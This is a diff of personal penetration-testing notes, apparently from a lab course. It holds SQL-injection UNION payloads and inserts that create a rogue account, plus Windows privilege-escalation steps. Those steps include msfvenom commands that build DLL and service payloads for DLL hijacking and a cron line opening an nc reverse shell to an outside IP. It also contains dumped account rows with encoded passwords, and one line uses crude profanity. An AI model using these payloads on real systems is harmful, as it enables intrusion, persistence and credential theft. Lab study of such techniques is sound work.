@@ -430,7 +430,7 @@ Column name has all the names of all the colmns in the all the data bases
 ' OR 1='1
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Post Edition SQL injection
-Audi ' UNION SELECT 1,2,3,4 #' <- Do this to see how many fields the request wants. Increment until it triggers
+Audi ' UNION SELECT 1,2,3,4' <- Do this to see how many fields the request wants. Increment until it triggers
 
 ## Modify golden statement to include all information
 UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #                     <- add buffer numbers (2 and 5) so that the golden statement will run
@@ -448,39 +448,7 @@ GET SQL injection
 ## GOLDEN STATEMENT FROM BEFORE
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Accountname', 'AccountLname', 'User', 'Pass', 'email', 3) 
 
-John', 'field1', 'field2', 1) --(
-John', 'field1', 'field2', 1)
-John', 'field1', 'field2', 3) INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'lastin', 'userin', 'passin', 'emailin', 1) --
-
-John' INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'lastin', 'userin', 'passin', 'emailin', 1)' 
-
-TABLE NAMES SQL FLAGS
-sqlinjection- categories, members, orderlines, orders,payments,permissions,products,share4
-
-CREVjLhhneaXcpyHZ7W9
-admin@website.com
-
-categories - id, name, description
-members- id, username, password, first_name, last_name, email, permission
-products - id, name, description, price, qty_left, category
-share4 - id, comment, mime, data
-payments - id,creditcard_number,date,order
-orders- id,date,member
-orderlines- id, quantity, product, order
-
-
-APPLICABLE_ROLES - GRANTEE, ROLE_NAME, IS_GRANTABLE, IS_DEFAULT
-
-
-
-
-permissions	id
-permissions	level
-permissions	name
-permissions	description
-products	id
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Optic-100-Silver' UNION SELECT GRANTEE,ROLE_NAME FROM information_schema.columns#'
 
@@ -1085,51 +1053,417 @@ cron.!info,!debug
 *.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
 #mail.*
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DLL Search Order
+
+Executables check the following locations (in successive order):
+
+
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+
+    The directory the the Application was run from  <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+    The directory specified in in the C+ function GetSystemDirectory()
+
+    The directory specified in the C+ function GetWindowsDirectory()
+
+    The current directory
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Windows Integrity Mechanism
+
+Integrity Levels
+
+Untrusted
+	
+
+Anonymous SID access tokens
+
+Low
+	
+
+Everyone SID access token (World)
+
+Medium
+	
+
+Authenticated Users
+
+High
+	
+
+Administrators
+
+System
+	
+
+System services (LocalSystem, LocalService, NetworkService)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Checking UAC
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+AutoElevate Executables
+
+Requested Execution Levels:
+
+    asInvoker
+
+    highestAvailable
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+net use Z:"\\http://live.sysinternals.com" /persistent:yes
+.\sigcheck.exe -m -accepteula C:\windows\System32\calc.exe <- <autoElevate>   <requested permissions>
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/bin/bash
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-lxd:x:105:65534::/var/lib/lxd/:/bin/false
-uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
-dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
-sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
-comrade:x:1001:1001::/home/comrade:/bin/bash
-mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
 
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false billybob:x:1001:1001:you found me 4kiY4BiNwUXEYHHco0ut:/home/billybob:/bin/bash billybob:x:1001:1001:you found me 4kiY4BiNwUXEYHHco0ut:/home/billybob:/bin/bash
+Scheduled Tasks & Services
 
+Items to evaluate include:
+
+
+    Write Permissions
+
+    Non-Standard Locations
+
+    Unquoted Executable Paths
+
+    Vulnerabilities in Executables
+
+    Permissions to Run As SYSTEM
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+schtasks /query /fo LIST /v
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+This creates a service called puttyService which uses C:\program files x86\putty\putty.exe, then it grants access to Built in users
+
+net use z: "\\http://live.sysinternals.com" /persistent:yes
+.\sc.exe create puttyService binpath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService' start=auto
+icacls "C:\Program Files (x86)\Putty" /grant BUILTIN\Users:W
+
+Go to Scheduled tasks -> actions -> create task -> switch user to system
+Set the trigger to startup and uncheck the box at the bottom of trigger, then go to actions and set it to start a program with the filepath of the application you're using
+
+(Pretend you didn't make it)
+Go to services sort by description or just find any sign of something that is user generated
+eneumerate the stupid bitch ass user generated service
+Find the file
+X:\.\Procmon -accepteula  <- X is whatever drive you used to drownload the sysinternals tools
+Process name contains putty.exe
+Result is NAME NOT FOUND
+Path contains .dll
+Run the malware
+It should show up with some .dlls in procmon
+(get-process | ?{$_.name -like "putty"}).kill()
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+make a payload:
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\comrade\Desktop\whoami.txt' -f dll > hijackmeplz.dll
+scp this over
+
+If unable to rename the application to abuse dlls (putty) then you will have to perform dll hijacking (above)
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\comrade\Desktop\whoami.txt' -f exe > service.exe
+scp this over
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+If no gui find services like this
+wmic service list full
+sc query
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+auditpol /get /category:*
+auditpol /get /category:* | findstr /i "<success or failure>"
+shows audit categories
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+4624/4625
+Successful/failed login
+
+4720
+Account created
+
+4672
+Administrative user logged on
+
+7045
+Service created
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+* * * * * root /bin/nc -e /bin/bash 192.168.28.135 33403
+mysql 	Server_name 	$servers
+mysql 	Host 	$servers
+mysql 	Db 	$servers
+mysql 	Username 	$servers
+mysql 	Password 	$servers
+mysql 	Port 	$servers
+mysql 	Socket 	$servers
+mysql 	Wrapper 	$servers
+mysql 	Owner 	$servers
+
+webserver6 10.50.35.215
+
+1 	Aaron 	$Aaron
+2 	user2 	$user2
+3 	user3 	$user3
+4 	Lroth 	$Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 	$Aaron
+2 	RntyrfVfNER78 	$user2
+3 	Obo4GURRnccyrf 	$user3
+4 	anotherpassword4THEages 	$Lroth
+
+
+mysql 	db_name 	$column_stats
+mysql 	table_name 	$column_stats
+mysql 	column_name 	$column_stats
+mysql 	min_value 	$column_stats
+mysql 	max_value 	$column_stats
+mysql 	nulls_ratio 	$column_stats
+mysql 	avg_length 	$column_stats
+mysql 	avg_frequency 	$column_stats
+mysql 	hist_size 	$column_stats
+mysql 	hist_type 	$column_stats
+mysql 	histogram 	$column_stats
+mysql 	Host 	$columns_priv
+mysql 	Db 	$columns_priv
+mysql 	User 	$columns_priv
+mysql 	Table_name 	$columns_priv
+mysql 	Column_name 	$columns_priv
+mysql 	Timestamp 	$columns_priv
+mysql 	Column_priv 	$columns_priv
+mysql 	Host 	$db
+mysql 	Db 	$db
+mysql 	User 	$db
+mysql 	Select_priv 	$db
+mysql 	Insert_priv 	$db
+mysql 	Update_priv 	$db
+mysql 	Delete_priv 	$db
+mysql 	Create_priv 	$db
+mysql 	Drop_priv 	$db
+mysql 	Grant_priv 	$db
+mysql 	References_priv 	$db
+mysql 	Index_priv 	$db
+mysql 	Alter_priv 	$db
+mysql 	Create_tmp_table_priv 	$db
+mysql 	Lock_tables_priv 	$db
+mysql 	Create_view_priv 	$db
+mysql 	Show_view_priv 	$db
+mysql 	Create_routine_priv 	$db
+mysql 	Alter_routine_priv 	$db
+mysql 	Execute_priv 	$db
+mysql 	Event_priv 	$db
+mysql 	Trigger_priv 	$db
+mysql 	db 	$event
+mysql 	name 	$event
+mysql 	body 	$event
+mysql 	definer 	$event
+mysql 	execute_at 	$event
+mysql 	interval_value 	$event
+mysql 	interval_field 	$event
+mysql 	created 	$event
+mysql 	modified 	$event
+mysql 	last_executed 	$event
+mysql 	starts 	$event
+mysql 	ends 	$event
+mysql 	status 	$event
+mysql 	on_completion 	$event
+mysql 	sql_mode 	$event
+mysql 	comment 	$event
+mysql 	originator 	$event
+mysql 	time_zone 	$event
+mysql 	character_set_client 	$event
+mysql 	collation_connection 	$event
+mysql 	db_collation 	$event
+mysql 	body_utf8 	$event
+mysql 	name 	$func
+mysql 	ret 	$func
+mysql 	dl 	$func
+mysql 	type 	$func
+mysql 	event_time 	$general_log
+mysql 	user_host 	$general_log
+mysql 	thread_id 	$general_log
+mysql 	server_id 	$general_log
+mysql 	command_type 	$general_log
+mysql 	argument 	$general_log
+mysql 	domain_id 	$gtid_slave_pos
+mysql 	sub_id 	$gtid_slave_pos
+mysql 	server_id 	$gtid_slave_pos
+mysql 	seq_no 	$gtid_slave_pos
+mysql 	help_category_id 	$help_category
+mysql 	name 	$help_category
+mysql 	parent_category_id 	$help_category
+mysql 	url 	$help_category
+mysql 	help_keyword_id 	$help_keyword
+mysql 	name 	$help_keyword
+mysql 	help_topic_id 	$help_relation
+mysql 	help_keyword_id 	$help_relation
+mysql 	help_topic_id 	$help_topic
+mysql 	name 	$help_topic
+mysql 	help_category_id 	$help_topic
+mysql 	description 	$help_topic
+mysql 	example 	$help_topic
+mysql 	url 	$help_topic
+mysql 	Host 	$host
+mysql 	Db 	$host
+mysql 	Select_priv 	$host
+mysql 	Insert_priv 	$host
+mysql 	Update_priv 	$host
+mysql 	Delete_priv 	$host
+mysql 	Create_priv 	$host
+mysql 	Drop_priv 	$host
+mysql 	Grant_priv 	$host
+mysql 	References_priv 	$host
+mysql 	Index_priv 	$host
+mysql 	Alter_priv 	$host
+mysql 	Create_tmp_table_priv 	$host
+mysql 	Lock_tables_priv 	$host
+mysql 	Create_view_priv 	$host
+mysql 	Show_view_priv 	$host
+mysql 	Create_routine_priv 	$host
+mysql 	Alter_routine_priv 	$host
+mysql 	Execute_priv 	$host
+mysql 	Trigger_priv 	$host
+mysql 	db_name 	$index_stats
+mysql 	table_name 	$index_stats
+mysql 	index_name 	$index_stats
+mysql 	prefix_arity 	$index_stats
+mysql 	avg_frequency 	$index_stats
+mysql 	database_name 	$innodb_index_stats
+mysql 	table_name 	$innodb_index_stats
+mysql 	index_name 	$innodb_index_stats
+mysql 	last_update 	$innodb_index_stats
+mysql 	stat_name 	$innodb_index_stats
+mysql 	stat_value 	$innodb_index_stats
+mysql 	sample_size 	$innodb_index_stats
+mysql 	stat_description 	$innodb_index_stats
+mysql 	database_name 	$innodb_table_stats
+mysql 	table_name 	$innodb_table_stats
+mysql 	last_update 	$innodb_table_stats
+mysql 	n_rows 	$innodb_table_stats
+mysql 	clustered_index_size 	$innodb_table_stats
+mysql 	sum_of_other_index_sizes 	$innodb_table_stats
+mysql 	name 	$plugin
+mysql 	dl 	$plugin
+mysql 	db 	$proc
+mysql 	name 	$proc
+mysql 	type 	$proc
+mysql 	specific_name 	$proc
+mysql 	language 	$proc
+mysql 	sql_data_access 	$proc
+mysql 	is_deterministic 	$proc
+mysql 	security_type 	$proc
+mysql 	param_list 	$proc
+mysql 	returns 	$proc
+mysql 	body 	$proc
+mysql 	definer 	$proc
+mysql 	created 	$proc
+mysql 	modified 	$proc
+mysql 	sql_mode 	$proc
+mysql 	comment 	$proc
+mysql 	character_set_client 	$proc
+mysql 	collation_connection 	$proc
+mysql 	db_collation 	$proc
+mysql 	body_utf8 	$proc
+mysql 	Host 	$procs_priv
+mysql 	Db 	$procs_priv
+mysql 	User 	$procs_priv
+mysql 	Routine_name 	$procs_priv
+mysql 	Routine_type 	$procs_priv
+mysql 	Grantor 	$procs_priv
+mysql 	Proc_priv 	$procs_priv
+mysql 	Timestamp 	$procs_priv
+mysql 	Host 	$proxies_priv
+mysql 	User 	$proxies_priv
+mysql 	Proxied_host 	$proxies_priv
+mysql 	Proxied_user 	$proxies_priv
+mysql 	With_grant 	$proxies_priv
+mysql 	Grantor 	$proxies_priv
+mysql 	Timestamp 	$proxies_priv
+mysql 	Host 	$roles_mapping
+mysql 	User 	$roles_mapping
+mysql 	Role 	$roles_mapping
+mysql 	Admin_option 	$roles_mapping
+mysql 	Server_name 	$servers
+mysql 	Host 	$servers
+mysql 	Db 	$servers
+mysql 	Username 	$servers
+mysql 	Password 	$servers
+mysql 	Port 	$servers
+mysql 	Socket 	$servers
+mysql 	Wrapper 	$servers
+mysql 	Owner 	$servers
+mysql 	start_time 	$slow_log
+mysql 	user_host 	$slow_log
+mysql 	query_time 	$slow_log
+mysql 	lock_time 	$slow_log
+mysql 	rows_sent 	$slow_log
+mysql 	rows_examined 	$slow_log
+mysql 	db 	$slow_log
+mysql 	last_insert_id 	$slow_log
+mysql 	insert_id 	$slow_log
+mysql 	server_id 	$slow_log
+mysql 	sql_text 	$slow_log
+mysql 	thread_id 	$slow_log
+mysql 	rows_affected 	$slow_log
+mysql 	db_name 	$table_stats
+mysql 	table_name 	$table_stats
+mysql 	cardinality 	$table_stats
+mysql 	Host 	$tables_priv
+mysql 	Db 	$tables_priv
+mysql 	User 	$tables_priv
+mysql 	Table_name 	$tables_priv
+mysql 	Grantor 	$tables_priv
+mysql 	Timestamp 	$tables_priv
+mysql 	Table_priv 	$tables_priv
+mysql 	Column_priv 	$tables_priv
+mysql 	Time_zone_id 	$time_zone
+mysql 	Use_leap_seconds 	$time_zone
+mysql 	Transition_time 	$time_zone_leap_second
+mysql 	Correction 	$time_zone_leap_second
+mysql 	Name 	$time_zone_name
+mysql 	Time_zone_id 	$time_zone_name
+mysql 	Time_zone_id 	$time_zone_transition
+mysql 	Transition_time 	$time_zone_transition
+mysql 	Transition_type_id 	$time_zone_transition
+mysql 	Time_zone_id 	$time_zone_transition_type
+mysql 	Transition_type_id 	$time_zone_transition_type
+mysql 	Offset 	$time_zone_transition_type
+mysql 	Is_DST 	$time_zone_transition_type
+mysql 	Abbreviation 	$time_zone_transition_type
+mysql 	Host 	$user
+mysql 	User 	$user
+mysql 	Password 	$user
+mysql 	Select_priv 	$user
+mysql 	Insert_priv 	$user
+mysql 	Update_priv 	$user
+mysql 	Delete_priv 	$user
+mysql 	Create_priv 	$user
+mysql 	Drop_priv 	$user
+mysql 	Reload_priv 	$user
+mysql 	Shutdown_priv 	$user
+mysql 	Process_priv 	$user
+mysql 	File_priv 	$user
+mysql 	Grant_priv 	$user
+mysql 	References_priv 	$user
+mysql 	Index_priv 	$user
+mysql 	Alter_priv 	$user
+mysql 	Show_db_priv 	$user
+mysql 	Super_priv 	$user
+mysql 	Create_tmp_table_priv 	$user
+mysql 	Lock_tables_priv 	$user
+mysql 	Execute_priv 	$user
+mysql 	Repl_slave_priv 	$user
+mysql 	Repl_client_priv 	$user
+mysql 	Create_view_priv 	$user
+mysql 	Show_view_priv 	$user
+mysql 	Create_routine_priv 	$user
+mysql 	Alter_routine_priv 	$user
+mysql 	Create_user_priv 	$user
+mysql 	Event_priv 	$user
+mysql 	Trigger_priv 	$user
+mysql 	Create_tablespace_priv 	$user
+mysql 	ssl_type 	$user
+mysql 	ssl_cipher 	$user
+mysql 	x509_issuer 	$user
+mysql 	x509_subject 	$user
+mysql 	max_questions 	$user
+mysql 	max_updates 	$user
+mysql 	max_connections 	$user
+mysql 	max_user_connections 	$user
+mysql 	plugin 	$user
+mysql 	authentication_string 	$user
+mysql 	password_expired 	$user
+mysql 	is_role 	$user
+mysql 	default_role 	$user
+mysql 	max_statement_time 	$user
